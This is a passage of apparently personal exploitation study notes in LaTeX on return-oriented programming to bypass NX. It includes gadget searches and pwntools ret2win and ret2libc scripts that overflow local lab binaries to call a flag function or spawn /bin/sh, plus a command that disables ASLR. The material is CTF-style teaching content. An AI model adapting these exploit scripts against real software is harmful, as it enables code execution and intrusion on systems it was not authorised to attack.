
\subsection{Bypass NX with ROP}

\subsubsection{Introduction}
Return Oriented Programing (ROP) is a technic used in case a program has NX bit
set (meaning the stack will not be executable).

The basis of ROP is chaining together small chunks of code already present
within the binary itself in such a way to do what you wish. This often involves
passing parameters to functions already present within \verb+libc+, such as
\verb+system+ 

\subsubsection{Gadgets}
Gadgets are small snippets of code followed by a \verb+ret+ instruction, e.g.
\verb+pop rdi; ret+. We can manipulate the \verb+ret+ of these gadgets in such a way
as to string together a large chain of them to do what we want.

for example consider we want to call a function and pass it a value in
\verb+rdi+ (first argument provided in \verb+x64+). Consider we find a gadget
\verb+pop rdi ; ret+.

the crafting a payload like this will do the job:
\begin{verbatim}
<padding_until_rip><gadget_addr><value><fun_addr>
\end{verbatim}

This mean \verb+<gadget_addr>+ replace the initial return value of the
vulnerable function. then what will happen is that when the \verb+ret+ of the
vuln function execut it pop the address of \verb+pop rdi+ then it pop
\verb+value+ in \verb+rdi+ then it exec the \verb+ret+ jumping to the function
we want.


to find gadgets: 
\begin{verbatim}
$ ROPgadget --binary ./vuln
Gadgets information
============================================================
0x080490da : adc al, 0x68 ; and al, al ; add al, 8 ; call eax
0x08049052 : adc al, 0xc0 ; add al, 8 ; push 0x10 ; jmp 0x8049020
0x08049042 : adc al, al ; add al, 8 ; push 8 ; jmp 0x8049020
0x08049126 : adc byte ptr [eax + 0x68], dl ; and al, al ; add al, 8 ; call edx
0x080491aa : adc byte ptr [eax - 0x3603a275], dl ; ret
0x08049057 : adc byte ptr [eax], al ; add byte ptr [eax], al ; jmp 0x8049020
...SNIP...
0x08049015 : test eax, eax ; je 0x804901b ; call eax

Unique gadgets found: 124
\end{verbatim}

or with ropper:
\begin{verbatim}
$ ropper -f htb-console --search "pop rdi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: htb-console
0x0000000000401473: pop rdi; ret;
\end{verbatim}

\subsubsection{ret2win (x86)}

since in \verb+x86+ all parameters are on the stack the exploit is quite simple
the payload is like this
\begin{verbatim}
<padding_until_RIP><fun_addr><rip_for_fun><param_1>...<param_n>
\end{verbatim}
regarding \verb+rip_for_fun+ we don't care where it jumps.


\begin{verbatim}
from pwn import *

p = process('./vuln-32')

payload = b'A' * 52            # Padding up to EIP
payload += p32(0x080491c7)     # Address of flag()
payload += p32(0x0)            # Return address - don't care if crashes when done
payload += p32(0xdeadc0de)     # First parameter
payload += p32(0xc0ded00d)     # Second parameter

log.info(p.clean())
p.sendline(payload)
log.info(p.clean())
\end{verbatim}

\subsubsection{ret2win (x64)}
more complex since most parameters are in registers. So we need to find gadget
that will \verb+pop+ into registers. We might have to chain them. Considering
that the flag function needs 2 arguments and 2 gadgets were found:
\begin{verbatim}
pop rdi; ret
pop rsi; pop 15; ret
\end{verbatim}

\begin{verbatim}
from pwn import *

p = process('./vuln-64')

POP_RDI, POP_RSI_R15 = 0x4011fb, 0x4011f9


payload = b'A' * 56            # Padding
payload += p64(POP_RDI)        # pop rdi; ret
payload += p64(0xdeadc0de)     # value into rdi -> first param
payload += p64(POP_RSI_R15)    # pop rsi; pop r15; ret
payload += p64(0xc0ded00d)     # value into rsi -> first param
payload += p64(0x0)            # value into r15 -> not important
payload += p64(0x40116f)       # Address of flag()
payload += p64(0x0)

log.info(p.clean())
p.sendline(payload)
log.info(p.clean())
\end{verbatim}


\subsubsection{ret2libc (x86)}

A \verb+ret2libc+ is based off the \verb+system+ function found within the C
library. This function executes anything passed to it making it the best
target. Another thing found within libc is the string \verb+/bin/sh+; if you
pass this string to system, it will pop a shell.

\begin{itemize}
    \item Getting Libc and its base: (only work with no PIE / no ASLR)
\begin{verbatim}
$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space 
$ ldd vuln-32
\end{verbatim}

    \item Getting the location of \verb+system()+
\begin{verbatim}
$ readelf -s <libc_path> | grep system
\end{verbatim}
or  from pwntools
\begin{verbatim}
exe.symbols['system'] # or exe.symbols.system
\end{verbatim}

    \item Getting the location of \verb+/bin/sh+: 
\begin{verbatim}
$ strings -a -t x <libc_path> | grep /bin/sh 
\end{verbatim}
\end{itemize}

exploit: 
\begin{verbatim}
from pwn import *

p = process('./vuln-32')

libc_base = 0xf7dc2000
# system = libc_base + 0x44f00
system = p.symbols['system']
binsh = libc_base + 0x18c32b

payload = b'A' * 76         # The padding
payload += p32(system)      # Location of system
payload += p32(0x0)         # return pointer - not important once we get the shell
payload += p32(binsh)       # pointer to command: /bin/sh

p.clean()
p.sendline(payload)
p.interactive()
\end{verbatim}

\subsubsection{ret2libc (x64)}
exploit in case of \verb+x64+
\begin{verbatim}
from pwn import *

p = process('./vuln-64')

libc_base = 0x7ffff7de5000
system = libc_base + 0x48e20
binsh = libc_base + 0x18a143

POP_RDI = 0x4011cb

payload = b'A' * 72         # The padding
payload += p64(POP_RDI)     # gadget -> pop rdi; ret
payload += p64(binsh)       # pointer to command: /bin/sh
payload += p64(system)      # Location of system
payload += p64(0x0)         # return pointer - not important once we get the shell

p.clean()
p.sendline(payload)
p.interactive()
\end{verbatim}


\subsubsection{pwntools ret2libc}
Note that pwntools offer automatic process to grab the needed address:

\begin{verbatim}

elf = context.binary = ELF('./vuln-32')
p = process()

libc = elf.libc                        # Simply grab the libc it's running with
libc.address = 0xf7dc2000              # Set base address

system = libc.sym['system']            # Grab location of system
binsh = next(libc.search(b'/bin/sh'))  # grab string location
\end{verbatim}


